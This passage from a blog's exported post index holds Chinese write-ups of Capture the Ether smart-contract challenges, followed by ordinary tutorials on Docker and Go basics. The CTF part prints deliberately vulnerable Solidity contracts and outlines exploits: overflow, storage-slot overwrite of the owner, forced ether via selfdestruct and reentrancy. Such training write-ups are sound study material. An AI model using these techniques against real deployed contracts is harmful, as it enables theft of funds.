^0.4.21;contract TokenWhaleChallenge &#123;    address player;    uint256 public totalSupply;    mapping(address =&gt; uint256) public balanceOf;    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;    string public name = &quot;Simple ERC20 Token&quot;;    string public symbol = &quot;SET&quot;;    uint8 public decimals = 18;    function TokenWhaleChallenge(address _player) public &#123;        player = _player;        totalSupply = 1000;        balanceOf[player] = 1000;    &#125;    function isComplete() public view returns (bool) &#123;        return balanceOf[player] &gt;= 1000000;    &#125;    event Transfer(address indexed from, address indexed to, uint256 value);    function _transfer(address to, uint256 value) internal &#123;        balanceOf[msg.sender] -= value;        balanceOf[to] += value;        emit Transfer(msg.sender, to, value);    &#125;    function transfer(address to, uint256 value) public &#123;        require(balanceOf[msg.sender] &gt;= value);        require(balanceOf[to] + value &gt;= balanceOf[to]);        _transfer(to, value);    &#125;    event Approval(address indexed owner, address indexed spender, uint256 value);    function approve(address spender, uint256 value) public &#123;        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);    &#125;    function transferFrom(address from, address to, uint256 value) public &#123;        require(balanceOf[from] &gt;= value);        require(balanceOf[to] + value &gt;= balanceOf[to]);        require(allowance[from][msg.sender] &gt;= value);        allowance[from][msg.sender] -= value;        _transfer(to, value);    &#125;&#125;\n分析：合约是一个与ERC20标准类似的货币，没有使用SafeMath库进行检查，问题更大的是transferFrom()函数中调用_transfer()不是在from和to之间的交易而是msg.sender和to之间的交易，这就是漏洞的关键我们可以利用一份代理地址，玩家可以给代理地址分配任意的allowance，由代理地址向玩家和另一个地址进行transferFrom()，这样在执行_transfer()的过程中，代理地址的余额将会发生溢出，获得大量的货币，最后再将代理地址的余额用transfer()转移给玩家就可以通过挑战了大致流程player：addr1ToAccount：addr2ProxyAccount：addr3  \n\nplayer.approve(addr3,1000000)        &#x2F;&#x2F;满足后续allowance[player][ProxyAccount]的条件  \nProxyAccount.transferFrom(addr1,addr2,1)        &#x2F;&#x2F;ToAccount无关紧要，交易完成后balanceOf[addr3]将会获得很多\nProxyAccount.transfer(player,1000000)        &#x2F;&#x2F;将获得的余额转入玩家地址\n\nRetirement fund源代码：\npragma solidity ^0.4.21;contract RetirementFundChallenge &#123;    uint256 startBalance;    address owner = msg.sender;    address beneficiary;    uint256 expiration = now + 10 years;    function RetirementFundChallenge(address player) public payable &#123;        require(msg.value == 1 ether);        beneficiary = player;        startBalance = msg.value;    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function withdraw() public &#123;        require(msg.sender == owner);        if (now &lt; expiration) &#123;            // early withdrawal incurs a 10% penalty            msg.sender.transfer(address(this).balance * 9 / 10);        &#125; else &#123;            msg.sender.transfer(address(this).balance);        &#125;    &#125;    function collectPenalty() public &#123;        require(msg.sender == beneficiary);        uint256 withdrawn = startBalance - address(this).balance;        // an early withdrawal occurred        require(withdrawn &gt; 0);        // penalty is what&#x27;s left        msg.sender.transfer(address(this).balance);    &#125;&#125;\n\n分析：要能够进行transfer操作除了own本人进行withdraw后，我们才能进行。但是因为withdrawn是一个uint256的数，我们只要往合约中投入一点ether，使得withdrawn发生溢出就能够绕过要求进行提款。攻击实现：我们看到在合约中并没有任何接受ether的方法，所以不能向合约直接发送ether，所以这里需要通过函数selfdestruct可参考Ethernaut 题8\nMapping源代码：\npragma solidity ^0.4.21;contract MappingChallenge &#123;    bool public isComplete;    uint256[] map;    function set(uint256 key, uint256 value) public &#123;        // Expand dynamic array as needed        if (map.length &lt;= key) &#123;            map.length = key + 1;        &#125;        map[key] = value;    &#125;    function get(uint256 key) public view returns (uint256) &#123;        return map[key];    &#125;&#125;\n\nDonation要求：取走合约中的钱源代码：\npragma solidity ^0.4.21;contract DonationChallenge &#123;    struct Donation &#123;        uint256 timestamp;        uint256 etherAmount;    &#125;    Donation[] public donations;    address public owner;    function DonationChallenge() public payable &#123;        require(msg.value == 1 ether);                owner = msg.sender;    &#125;        function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function donate(uint256 etherAmount) public payable &#123;        // amount is in ether, but msg.value is in wei        uint256 scale = 10**18 * 1 ether;        require(msg.value == etherAmount / scale);        Donation donation;        donation.timestamp = now;        donation.etherAmount = etherAmount;        donations.push(donation);    &#125;    function withdraw() public &#123;        require(msg.sender == owner);                msg.sender.transfer(address(this).balance);    &#125;&#125;\n分析：只有成为owner才能进行withdraw，将钱取出来。（合约中没有任何直接修改owner的方法）在donate函数中直接对结构体Donation进行了初始化，并没有使用memory关键字，于是此处的Donation存储在storage中，由合约对属性的定义顺序，owner的key值为1，恰好donation.etherAmount会将其覆盖，也就是说：我们只需要将我们的地址作为参数执行donate方法便可以更改owner。因为require(msg.value == etherAmount / scale)这一条件。我们将自己的地址进行计算一下，来得知我们需要向合约发送多少value。\n实现：\nfunction getValut(uint256 amount) public pure returns (uint2565) &#123;    return amount / 10**36;&#125;\n通过计算得出msg.value的值为979192615699在执行donate方法成功后我们再次调用owner可以看到owner已经是我们自己的地址了，接着进行withdraw就可以通关了。\nFifty years要求：等到50年后取走合约中的money源代码：\npragma solidity ^0.4.21;contract FiftyYearsChallenge &#123;    struct Contribution &#123;        uint256 amount;        uint256 unlockTimestamp;    &#125;    Contribution[] queue;    uint256 head;    address owner;    function FiftyYearsChallenge(address player) public payable &#123;        require(msg.value == 1 ether);        owner = player;        queue.push(Contribution(msg.value, now + 50 years));    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function upsert(uint256 index, uint256 timestamp) public payable &#123;        require(msg.sender == owner);        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;            // Update existing contribution amount without updating timestamp.            Contribution storage contribution = queue[index];            contribution.amount += msg.value;        &#125; else &#123;            // Append a new contribution. Require that each contribution unlock            // at least 1 day after the previous one.            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);            contribution.amount = msg.value;            contribution.unlockTimestamp = timestamp;            queue.push(contribution);        &#125;    &#125;    function withdraw(uint256 index) public &#123;        require(msg.sender == owner);        require(now &gt;= queue[index].unlockTimestamp);        // Withdraw this and any earlier contributions.        uint256 total = 0;        for (uint256 i = head; i &lt;= index; i++) &#123;            total += queue[i].amount;            // Reclaim storage.            delete queue[i];        &#125;        // Move the head of the queue forward so we don&#x27;t have to loop over        // already-withdrawn contributions.        head = index + 1;        msg.sender.transfer(total);    &#125;&#125;\n分析：第一点：如何解决50年的时间问题：这里的unlockTimestamp可以发生上溢从而归零。所以在upsert函数中通过设置timestamp=0可以将时间限制解除。于是需要对upsert进行两次调用，第一次将unlockTimeStamp设置为+1days就能发生溢出的极限值，第二次调用就可以绕过检查设置为0。根据前面几题的经验可以看到在upsert函数中contribution.amount和contribution.unlockTimestamp都造成了变量覆盖：分别将queue的长度和head的值进行了覆盖。实现：\n\n部署合约\n进行第一次upsert调用，设置为时间溢出的极限值这里应该设1wei，否则queue的length不够\n进行第二次upsert调用，设置为0\n\n第一次调用中同时改变了head的值，index大于2不是硬性要求4. 第三次进行withdraw调用\nAccounts这一部分有一些关于以太坊的密码学原理包括椭圆曲线加密，ECDSA签名算法等，他们与合约漏洞并无关系\nFuzzy identity要求：获取私钥源代码：\npragma solidity ^0.4.21;interface IName &#123;    function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123;    bool public isComplete;    function authenticate() public &#123;        require(isSmarx(msg.sender));        require(isBadCode(msg.sender));        isComplete = true;    &#125;    function isSmarx(address addr) internal view returns (bool) &#123;        return IName(addr).name() == bytes32(&quot;smarx&quot;);    &#125;    function isBadCode(address _addr) internal pure returns (bool) &#123;        bytes20 addr = bytes20(_addr);        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;        for (uint256 i = 0; i &lt; 34; i++) &#123;            if (addr &amp; mask == id) &#123;                return true;            &#125;            mask &lt;&lt;= 4;            id &lt;&lt;= 4;        &#125;        return false;    &#125;&#125;\n分析：要通过验证需要通过isSmarx()和isBadCode()的验证，因此需要一个能返回一个特殊名字smarx的合约以及合约地址包含十六进制字符串badc0de。因此，这个挑战就是要暴力破解大量合约，直到你最终获得一个包含目标字符串的合约地址\n\ntips：十六进制字面常数十六进制字面常数以关键字 hex 打头，后面紧跟着用单引号或双引号引起来的字符串（例如，hex”001122FF”）。 字符串的内容必须是一个十六进制的字符串，它们的值将使用二进制表示。它们可以隐式地转换成 bytes1，……，bytes32，如果合适的话，还可以转换成 bytes 以及 string。\n\nPublic Key要求：账户的公钥源代码：\npragma solidity ^0.4.21;contract PublicKeyChallenge &#123;    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;    bool public isComplete;    function authenticate(bytes publicKey) public &#123;        require(address(keccak256(publicKey)) == owner);        isComplete = true;    &#125;&#125;\n我们都知道以太坊的地址与比特币的一样由公钥计算而来。在用户进行交易时往往需要进行签名，而这个签名中就含有公钥（供其他人验证交易来自于该账户），\nAccount Takeover要求：成为owner源代码：\npragma solidity ^0.4.21;contract AccountTakeoverChallenge &#123;    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;    bool public isComplete;    function authenticate() public &#123;        require(msg.sender == owner);        isComplete = true;    &#125;&#125;\n\nMiscellaneousAssume ownership要求：成为owner源代码：  \npragma solidity ^0.4.21;contract AssumeOwnershipChallenge &#123;    address owner;    bool public isComplete;    function AssumeOwmershipChallenge() public &#123;        owner = msg.sender;    &#125;    function authenticate() public &#123;        require(msg.sender == owner);        isComplete = true;    &#125;&#125;\n分析：构造函数的错误使其变成了一个公共的方法，使得任何人都可以直接使用来声明所有权。\nToken bank要求：获取Token合约中的余额源代码：\npragma solidity ^0.4.21;interface ITokenReceiver &#123;    function tokenFallback(address from, uint256 value, bytes data) external;&#125;contract SimpleERC223Token &#123;    // Track how many tokens are owned by each address.    mapping (address =&gt; uint256) public balanceOf;    string public name = &quot;Simple ERC223 Token&quot;;    string public symbol = &quot;SET&quot;;    uint8 public decimals = 18;    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);    event Transfer(address indexed from, address indexed to, uint256 value);    function SimpleERC223Token() public &#123;        balanceOf[msg.sender] = totalSupply;        emit Transfer(address(0), msg.sender, totalSupply);    &#125;    function isContract(address _addr) private view returns (bool is_contract) &#123;        uint length;        assembly &#123;            //retrieve the size of the code on target address, this needs assembly            length := extcodesize(_addr)        &#125;        return length &gt; 0;    &#125;    function transfer(address to, uint256 value) public returns (bool success) &#123;        bytes memory empty;        return transfer(to, value, empty);    &#125;    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;        require(balanceOf[msg.sender] &gt;= value);        balanceOf[msg.sender] -= value;        balanceOf[to] += value;        emit Transfer(msg.sender, to, value);        if (isContract(to)) &#123;            ITokenReceiver(to).tokenFallback(msg.sender, value, data);        &#125;        return true;    &#125;    event Approval(address indexed owner, address indexed spender, uint256 value);    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;    function approve(address spender, uint256 value)        public        returns (bool success)    &#123;        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);        return true;    &#125;    function transferFrom(address from, address to, uint256 value)        public        returns (bool success)    &#123;        require(value &lt;= balanceOf[from]);        require(value &lt;= allowance[from][msg.sender]);        balanceOf[from] -= value;        balanceOf[to] += value;        allowance[from][msg.sender] -= value;        emit Transfer(from, to, value);        return true;    &#125;&#125;contract TokenBankChallenge &#123;    SimpleERC223Token public token;    mapping(address =&gt; uint256) public balanceOf;    function TokenBankChallenge(address player) public &#123;        token = new SimpleERC223Token();        // Divide up the 1,000,000 tokens, which are all initially assigned to        // the token contract&#x27;s creator (this contract).        balanceOf[msg.sender] = 500000 * 10**18;  // half for me        balanceOf[player] = 500000 * 10**18;      // half for you    &#125;    function isComplete() public view returns (bool) &#123;        return token.balanceOf(this) == 0;    &#125;    function tokenFallback(address from, uint256 value, bytes) public &#123;        require(msg.sender == address(token));        require(balanceOf[from] + value &gt;= balanceOf[from]);        balanceOf[from] += value;    &#125;    function withdraw(uint256 amount) public &#123;        require(balanceOf[msg.sender] &gt;= amount);        require(token.transfer(msg.sender, amount));        balanceOf[msg.sender] -= amount;    &#125;&#125;\n分析：合约自定义了ERC-233标准，（ERC-233与ERC-20的不同之处在于如果接收人的地址是一个合约将会通过tokenFallback方法来通知接收方转移。在Token合约创建的时候，就有一百万的token余额，其中50万给了创建者，50万给了玩家。所以需要获取更多的token来完成挑战。可以看到如果我们通过攻击合约利用Token合约向Bank转账时，会触发isContract执行Bank合约中的tokenFallback从而增加Bank中的余额，之后我们再通过withdraw向Bank取款就行了。  \n\n同时在withdraw函数中合约先向我们转账再减我们的余额，这使得我们可以重复地提取我们的余额，重入的过程将会是：challenge.withdraw() -&gt; token.transfer() -&gt; msg.sender.tokenFallback() -&gt; ... 直到余额为0。\n\n实现：先部署攻击合约，再将攻击合约作为player部署Bank接着直接调用CallWithdraw（执行成功后，可以在交易日志中看到进行了两次transfer调用。进入tokenFallback后又调用了一次）\n","categories":["靶场"],"tags":["题解","Remix","CapturetheEther"]},{"title":"web3.js","url":"/2023/04/11/web3-js/","content":""},{"title":"docker","url":"/2023/07/18/docker/","content":"docker简介解决应用在不同开发环境上的环境配置的麻烦————docker：系统平滑移植，容器虚拟化技术\nDocker可以将软件的原生环境复制过来，消除了协作编码时 “我的机器上可以正常工作” 的问题\n概念Docker是基于GO的云开源项目，解决运行环境和配置问题的软件容器，方便做持续集成、整体发布的容器虚拟化技术。\ndocker特点“Build， Ship and Run Any App， Anywhere”\n通过对应用的封装、发布、部署、运行等生命周期的管理，使其能够做到“一次镜像，处处运行”\n\n安全可靠  容器间的隔离不仅限于彼此，还独立于底层的基础设施。当应用出现问题时，不会波及到主机\n\n资源利用率高  容器拥有很高的兼容性，能够将应用直接迁移到另一个平台，提高了开发效率，减少了部署应用的工作量\n\n标准开放  容器基于开放式标准，能够在任何基础设施上运行。运输方式、存储方式、API接口隔离\n\n轻量化  容器的构建快速且使用更少的计算和内存，\n\n\n架构与主要功能组件docker整体采用C&#x2F;S模式，客户端主要负责发送操作指令，服务端负责接受和处理指令。客户端和服务端之间的通信方式多样\n功能组件\nDocker客户端  Docker客户端一般通过Docker command来发起请求\nDocker服务器（Docker daemon）  接受客户端发来的请求，并实现所要求的的功能，同时针对请求返回相应的结果。\nDocker容器\nDocker镜像  镜像是一个只读的模板，用来创建相应的容器。\nDocker仓库  仓库是存放镜像的地方，类似于Maven，GitHub。docker提供的官方registry————Docker Hub。仓库可分为公开仓库和私有仓库\n\n与传统虚拟机的对比虚拟机（virtual machine），可以在一种操作系统里运行另一种操作系统。\n传统虚拟机技术是通过在主操作系统上的虚拟管理系统（VMware、virtualBox）创建虚拟机（模拟各种硬件），安装操作系统，安装部署各种应用\n\n特点\n资源占用多\n冗余步骤多\n启动慢\n\n\n\nLinux容器（Linux Containers，LXC）是与系统其他部分隔离开的一系列进程，容器不是模拟一个完整的操作系统而是对进程进行隔离，将软件运行所需的所有资源打包到一个隔离的容器中，因此在开发到测试再到生产的过程中，他都具有可移植性和一致性。容器虚拟化技术不需要捆绑一整套操作系统，只需要软件工作所需的库资源和设置，整个过程更轻量，高效并保证在任何环境中能够运行\n总结：容器是在操作系统层面上实现虚拟化，容器之间共享主机的操作系统，容器作为进程在主机上运行；而虚拟机是在硬件层面上实现虚拟化，有自己的操作系统且独立于主机操作系统。\n安装Cgroup对进程资源进行限制，对资源的使用进行追踪。\n容器容器是镜像的运行实例，就如同Java语言中类与对象的关系。\n容器是一个轻量级的沙箱子，可以被启动、开始、停止、删除，每个容器之间相互隔离，保证了平台的安全。\ndocker常用指令容器生命周期管理\ndocker run\n  创建一个新的容器（并运行一个命令）\n  docker run [OPTIONS] IMAGE [COMMAND]\n  常见参数：\n\n-d：后台运行容器，将返回容器ID\n-i：以交互模式运行容器，常与-i一起使用\n-P：随机端口映射，容器内部端口随机映射到主机的端口\n-p：指定端口映射，格式主机端口:容器端口\n-t：为容器分配一个伪输入终端\n–name：为容器指定一个名称\n–net：指定容器的网络连接类型\n–link：连接到另一个容器\n–volume：绑定一个卷\n\n\ndocker start&#x2F;stop&#x2F;restart\n  start：启动一个或多个已被停止的容器\n  stop：停止一个正在运行的容器\n  restart：重启容器\n\ndocker kill\n  杀掉一个运行中的容器\n\ndocker rm\n  删除一个或多个容器\n\ndocker exec\n\n\n容器操作\ndocker ps\n\ndocker inspect\n  获取容器&#x2F;镜像的元数据。\n\ndocker attach\n\ndocker\n\n\n本地镜像管理\ndocker image tag\n\ndocker image build \n  根据Dockerfile文件构建新镜像，其中还有些常见的选项，简写为docker build\n\n-t，生成镜像的名字及标签，可以在一次构建中为一个镜像设置多个标签\n-f，指定使用的Dockerfile文件\n\n\ndocker image history\n  可以查看指定镜像的创建历史\n\ndocker image save\n\ndocker image load\n\n\n容器rootfs命令\ndocker commit\ndocker cp\n\n镜像仓库\ndocker login&#x2F;logout\ndocker pull\ndocker push\ndocker search\n\ninfo|version\ndocekr info\ndocker version\n\n"},{"title":"Golang","url":"/2023/04/28/Golang/Golang/","content":"前言为了解决在软件开发过程中的一些令人头疼的问题并尝试设计一门全新的编程语言，且不是用奇怪的语法和晦涩难懂的概念来从根本上推翻已有的编程语言。\nGo语言就在这样的环境下诞生了，它让人感觉像是Python或Ruby这样的动态语言，却又拥有像C或者Java这类语言的高性能和安全性。\n它提倡通过接口来面向对象编程，通过goroutine和channel来支持并发和并行编程。\nGO语言特色\n简洁、快速、安全\n从本质上实现并发编程\n使用静态类型，执行速度非常快\n作为强类型语言，隐式的类型转换是不被允许的Go语言通过改善或去除在C、C++或Java中一些特性来使开发更加便利，例如变量的默认初始化，内存分配和自动回收。\n\n所有的行为都突出一个宗旨：减少不必要的编码工作使代码更加简洁，从而比传统的面向对象语言更容易阅读和理解。\nGO用途Go 语言的主要目标是将静态语言的安全性和高效性与动态语言的易开发性进行有机结合，达到完美平衡；\n用于实现一般目标的语言，例如对文本的处理，前端展现，像脚本一样使用…\n另一个目标是对于网络通信、并发和并行编程的极佳支持，从而更好地利用大量的分布式和多核的计算机。\n用于Web服务器的开发\n\n记住，学习一门新语言的最佳方式就是实践，运行它的代码，修改并尝试更多的方案。\n\n","categories":["Golang"],"tags":["教程"]},{"title":"Go基础语法","url":"/2023/05/05/Golang/go-BasicGrammer/","content":"Go语言基础语法go标记Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。fmt.Println(&quot;Hello,Go!!&quot;)这一个语句就由6个标记组成：\n\nfmt\n.\nPrintln\n(\n“Hello,Go!!”\n)\n\n行分隔符GO程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号1;结尾，因为这些工作都将由 Go 编译器自动完成。\n\n如果你打算将多个语句写在同一行，它们则必须使用;人为区分，但在实际开发中我们并不鼓励这种做法。\n\n注释注释不会被编译，每一个包应该有相关注释。\n单行注释是最常见的注释形式，你可以在任何地方使用以 &#x2F;&#x2F; 开头的单行注释。\n多行注释也叫块注释，均已以 &#x2F;* 开头，并以 *&#x2F; 结尾。如：\n// 单行注释/* 我是多行注释 */\n标识符用来命名变量、类型等程序实体。\n第一个字符必须是字母或下划线而不能是数字。且不包括关键字、不包含运算符\n_本身就是一个特殊的标识符，被称为空白标识符。它可以像其他标识符那样用于变量的声明或赋值（任何类型都可以赋值给它），但任何赋给这个标识符的值都将被抛弃，因此这些值不能在后续的代码中使用，也不可以使用这个标识符作为变量对其它变量进行赋值或运算。\n关键字\n\n\n\n\n\n\n\n\n\n\nbreak\ndefault\nfunc\ninterface\nselect\n\n\ncase\ndefer\ngo\nmap\nstruct\n\n\nchan\nelse\ngoto\npackage\nswitch\n\n\nconst\nfallthrough\nif\nrange\ntype\n\n\ncontinue\nfor\nimport\nreturn\nvar\n\n\n预定义标识符：\n\n\n\n\n\n\n\n\n\n\n\nappend\nbool\nbyte\ncap\nclose\n\n\ncopy\nfalse\nfloat32\nfloat64\nimag\n\n\nint32\nint64\niota\nlen\nmake\n\n\nprint\nprintln\nreal\nrecover\nstring\n\n\n空格的使用空格通常用于分隔标识符、关键字、运算符和表达式，以提高代码的可读性。\n\nGo语言中变量的声明必须使用空格隔开\n在关键字和表达式之间要使用空格\n在函数调用时，函数名和左边等号之间要使用空格，参数之间也要使用空格\n在运算符和操作数之间要使用空格能让程序更易阅读\n在变量与运算符间加入空格，程序看起来更加美观\n\n格式化字符串使用fmt.Sprintf或fmt.Printf格式化字符串并赋值给新串\nfmt.Sprintf根据格式化参数生成格式化的字符串并返回该字符串\nfmt.Sprintf(格式化样式, 参数列表...)\n\n格式化样式：字符串形式、格式化符号%\n参数列表：多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。\n\nGo 字符串格式化符号:  \n\n\n\n格式\n描述\n\n\n\n%v\n按值的本来值输出\n\n\n%+v\n在 %v 基础上，对结构体字段名和值进行展开\n\n\n%#v\n输出 Go 语言语法格式的值\n\n\n%T\n输出 Go 语言语法格式的类型和值\n\n\n%%\n输出 % 本体\n\n\n%b\n整型以二进制方式显示\n\n\n%o\n整型以八进制方式显示\n\n\n%d\n整型以十进制方式显示\n\n\n%x\n整型以十六进制方式显示\n\n\n%X\n整型以十六进制方式显示，字母大写\n\n\n%U\nUnicode 字符\n\n\n%f\n浮点数\n\n\n%p\n指针，十六进制方式显示\n\n\nExample：\npackage mainimport (    &quot;fmt&quot;    &quot;io&quot;    &quot;os&quot;)func main() &#123;    // 声明数字变量    const num1, num2, num3 = 5, 10, 15     // 调用 Sprintf() 函数    s := fmt.Sprintf(&quot;%d + %d = %d&quot;, num1, num2, num3)     // 使用 WriteString() 函数将结果输出到终端 to write the    //  &quot;os.Stdout&quot; 为字符串的内容    io.WriteString(os.Stdout, s) &#125;\nfmt.Printf根据格式化参数生成格式化的字符串并写入标准输出。与fmt.Sprintf格式类似，但fmt.Printf直接输出，更方便调试字符串连接：通过+实现：\n","categories":["Golang"]},{"title":"数据类型","url":"/2023/05/07/Golang/go-dataStructure/","content":"数据类型数据类型的出现是为了把数据分成所需内存大小不同的数据，编程的时候需要用大数据的时候才需要申请大内存，就可以充分利用内存。\n布尔型\n常量true\n常量false\n\n数字类型整型有8位，16位，32位，64位\n\nint：有符号\nuint：无符号\n\n浮点型\nfloat32：32位浮点型数\nfloat64：64位浮点型数\n\n复数\ncomplex64：32位实数和虚数\ncomplex128：64位实数和虚数\n\n\nbyte:类似uint8rune:类似int32uintptr:无符号整型，用于存放一个指针\n\n字符串类型Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。\n\n派生类型指针、数组、结构体、channel、函数、切片、接口、Map\n\n数组数组是具有相同唯一类型的一组已编号且长度固定的数据项序列，这种类型可以是任意的原始类型例如整型、字符串或者自定义类型。\n数组元素可以通过索引来读取（或修改），索引从 0 开始，第一个元素索引为 0，第二个索引为 1，以此类推。\n声明数组Go语言数组声明需要指定元素类型及元素个数：var array_name [size]type\n初始化数组var nums = [5]int&#123;100, 2, 5, 8, 10&#125; \n通过字面量在声明数组的同时快速初始化数组： nums := [5]int&#123;100, 2, 5, 8, 10&#125;\n如果数组长度不确定可以使用...代替，此时编译器会根据元素个数自行推断数组长度var nums = [...]int&#123;100, 2, 5, 8, 10&#125; \n设置了数组的长度，我们还可以通过指定下标(key:value)来初始化元素：nums := [5]int&#123;1:2, 4:10&#125; // [0, 2, 0, 0, 10]\n\n初始化数组中&#123;&#125;中的元素个数不能大于[]中的数字。在初始化时没有指定初值的元素将会赋值为零值\n\n访问数组元素数组元素可以通过索引（位置）来读取。\n对数组的遍历多采用循环结构\n范围（Range）range关键字用于循环中迭代数组、切片、通道或集合的元素。\n在数组和切片中它返回元素的索引和索引对应的值，在集合中返回key-value对。\n示例\n\n多维数组Go 语言支持多维数组，以下为常用的多维数组声明方式：var arr_name [SIZE1][SIZE2]...[SIZEN]type\n二维数组是最简单的多维数组，本质是由多个一维数组组成。\nvar arrayName [x][y]type\n二维数组可认为是一个表格，x 为行，y 为列.\n多维数组初始化或赋值时需要注意Go语法规范，该写在一行就写在一行，一行一条语句。\na := [3][4]int&#123;   &#123;0, 1, 2, 3&#125; ,    &#123;4, 5, 6, 7&#125; ,    &#123;8, 9, 10, 11&#125;, // 这里的 &#125; 必须要有逗号，因为最后一行的 &#125; 不能单独一行，&#125;// 或者写成这样a := [3][4]int&#123;   &#123;0, 1, 2, 3&#125; ,    &#123;4, 5, 6, 7&#125; ,    &#123;8, 9, 10, 11&#125;&#125;   \n实例\npackage mainimport &quot;fmt&quot;func main() &#123;    // 创建二维数组    sites := [2][2]string&#123;&#125;    // 向二维数组添加元素    sites[0][0] = &quot;Google&quot;    sites[0][1] = &quot;Runoob&quot;    sites[1][0] = &quot;Taobao&quot;    sites[1][1] = &quot;Weibo&quot;    // 显示结果    fmt.Println(sites)&#125;\n向函数传递数组的注意事项未定义长度的数组只能传给不限制数组长度的函数\n定义了长度的数组只能传给限制了相同数组长度的函数\npackage mainimport &quot;fmt&quot;// Go 语言的数组是值，其长度是其类型的一部分，作为函数参数时，是值传递func change1(nums [3]int) &#123;    nums[0] = 4&#125;// 传递进来数组的内存地址，然后定义指针变量指向该地址，则会改变数组的值func change2(nums *[3]int) &#123;    nums[0] = 5&#125;// Go 语言中对数组的处理，一般采用切片的方式，切片包含对底层数组内容的引用，作为函数参数时，类似于指针传递func change3(nums []int) &#123;      nums[0] = 6&#125;func main() &#123;   var nums1 = [3]int&#123;1, 2, 3&#125;      var nums2 = []int&#123;1, 2, 3&#125;       change1(nums1)       fmt.Println(nums1)  //  [1 2 3]        change2(&amp;nums1)       fmt.Println(nums1)  //  [5 2 3]       change3(nums2)       fmt.Println(nums2)  //  [6 2 3]&#125;\n\n指针一个指针变量指向了一个值的内存地址。\n指针的使用：定义——&gt;赋值——&gt;访问指针变量的值\n在使用指针前你需要声明指针：var name *type\ntype为指针类型，name为指针变量名，*号用于指定变量是一个指针。\n空指针：当一个指针被定义后没有分配到任何变量时，它的值为nil\n指针数组存储数组的值：var ptr [MAX]*int\n指针的指针如果一个指针变量存放的又是另一个指针变量的地址，则称这个指针变量为指向指针的指针变量。\n当定义一个指向指针的指针变量时，第一个指针存放第二个指针的地址，第二个指针存放变量的地址：\nvar ptr **int声明了一个指针的指针变量的整型\n访问指向指针的指针变量值需要使用两个*号\n结构体结构体是由一系列具有相同类型或不同类型的数据构成的数据集合，结构体表示一项记录。\n定义结构体type和struct的使用，type设定了结构体的名称，struct定义一个新的数据类型。\n定义了结构体类型，它才能用于声明一个变量\n访问结构体成员使用.操作符\n结构体指针用于存储结构体变量的地址，查看、修改结构体变量的成员，同其他\n结构体作函数参数结构体可以像其他数据类型一样作为参数传递给函数，是值传递。\n如果想在函数体内改变结构体内容，需要使用指针\n切片Go语言切片是对数组的抽象。\nGo数组的长度不可改变，Go中提供了一种灵活，功能强悍的内置类型切片(“动态数组”)，与数组相比切片的长度不固定的，可以追加。\n定义切片\n声明一个未指定大小的数组var identifier []type\n使用make()函数创建var slice []type = make([]type, len)或者通过内置函数make()初始化切片ss :=make([]int,len,cap),[]int标识为其元素类型为int的切片。make()函数这里容量可选\n\n切片的初始化切片可以直接通过数组来初始化，也可以通过内置函数make()初始化。\n初始化时默认len=cap，在追加元素时如果容量cap不足时将按len的2倍扩容。\ns :=[] int &#123;1,2,3 &#125;直接初始化切片，[]表示是切片类型，&#123;1,2,3&#125;初始化值依次是1,2,3。其cap=len=3。\ns := arr[:]初始化切片s，是数组arr的引用。\ns := arr[startIndex:endIndex]将arr中从下标startIndex 到 endIndex-1下的元素创建为一个新的切片。（不包含endIndex）\ns := arr[startIndex:]缺少endIndex时将表示一直到arr的最后一个元素。\ns := arr[:endIndex]缺少startIndex时将表示从arr的第一个元素开始。\ns1 := s[startIndex:endIndex]通过切片s初始化切片s1\n内置函数\n\n\n名称\n说明\n\n\n\nlen()\n获取切片长度\n\n\ncap()\n切片最大容量\n\n\nappend()\n追加元素\n\n\ncopy()\n拷贝\n\n\n示例package mainimport &quot;fmt&quot;func main() &#123;   numbers := []int&#123;0,1,2,3,4,5,6,7,8,9&#125;   number1:=make([]int,0,5)   number2:=numbers[:3]   number3:=numbers[2:5]   number4:=numbers[3:8]   // cap的大小与截取的位置有关   // number3 的 ptr 指向第三个元素，后面还剩8个元素所以cap=8   // number4 的 ptr 指向第四个元素，后面还剩7个元素所以cap=7   printSlice(numbers)  //len=10  cap=10 slice=[0 1 2 3 4 5 6 7 8 9]   printSlice(number1)  //len=0  cap=5 slice=[]   printSlice(number2)  //len=3  cap=10 slice=[0 1 2]   printSlice(number3)  //len=3  cap=8 slice=[2 3 4]   printSlice(number4)  //len=5  cap=7 slice=[3 4 5 6 7]   // append()   // copy()   &#125;func printSlice(x []int) &#123;   fmt.Printf(&quot;len=%d  cap=%d   slice=%v\\n&quot;,len(x),cap(x),x)&#125;\nMap（集合）Map是一种无序的键值对的集合。遍历 Map时返回的键值对的顺序是不确定的。\nMap是引用类型，如果将一个Map传递给一个函数或赋值给另一个变量，它们都指向同一个底层数据结构，因此对Map的修改会影响到所有引用它的变量\n定义Map\nmake函数\n\nmap := make(map[KeyType]ValueType, cap)2. map关键字\n m := map[string]int&#123;&quot;apple&quot;: 1, &quot;banana&quot;:2&#125;\n基本操作package mainimport &quot;fmt&quot;func main() &#123;   var siteMap map[string]string /*创建集合 */   siteMap = make(map[string]string)   /* map 插入 key - value 对,各个国家对应的首都 */   siteMap [ &quot;Google&quot; ] = &quot;谷歌&quot;   siteMap [ &quot;Runoob&quot; ] = &quot;菜鸟教程&quot;   siteMap [ &quot;Baidu&quot; ] = &quot;百度&quot;   siteMap [ &quot;Wiki&quot; ] = &quot;维基百科&quot;   // 